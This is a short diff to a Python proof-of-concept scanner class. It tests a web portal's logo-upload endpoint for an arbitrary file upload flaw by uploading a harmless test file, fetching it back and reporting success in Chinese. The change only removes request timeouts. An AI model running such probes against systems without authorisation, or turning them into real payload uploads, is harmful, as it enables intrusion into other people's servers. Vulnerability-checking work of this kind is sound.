@@ -54,11 +54,11 @@ class poc:
             "upload": ("test.txt", b"test", "image/png")
         }
         try:
-            result = requests.post(url=url, files=data, headers=self.headers, verify=False, timeout=3, allow_redirects=False, proxies=self.proxies)
+            result = requests.post(url=url, files=data, headers=self.headers, verify=False, allow_redirects=False, proxies=self.proxies)
             filename_re = re.compile('gp.uploadLogoSuccess\("nullLogo","(.*?)",""\)')
             filename = filename_re.search(result.text).group(1)
             url_test = "{}://{}/portal/res/file/upload/{}".format(scheme, netloc, filename)
-            result_end = requests.get(url=url_test, headers=self.headers, verify=False, timeout=3, proxies=self.proxies)
+            result_end = requests.get(url=url_test, headers=self.headers, verify=False, proxies=self.proxies)
             if "test" in result_end.text:
                 target = urlparse(url)
                 self.result_text += """\n        [+]    \033[32m检测到目标站点存在任意文件上传漏洞\033[0m
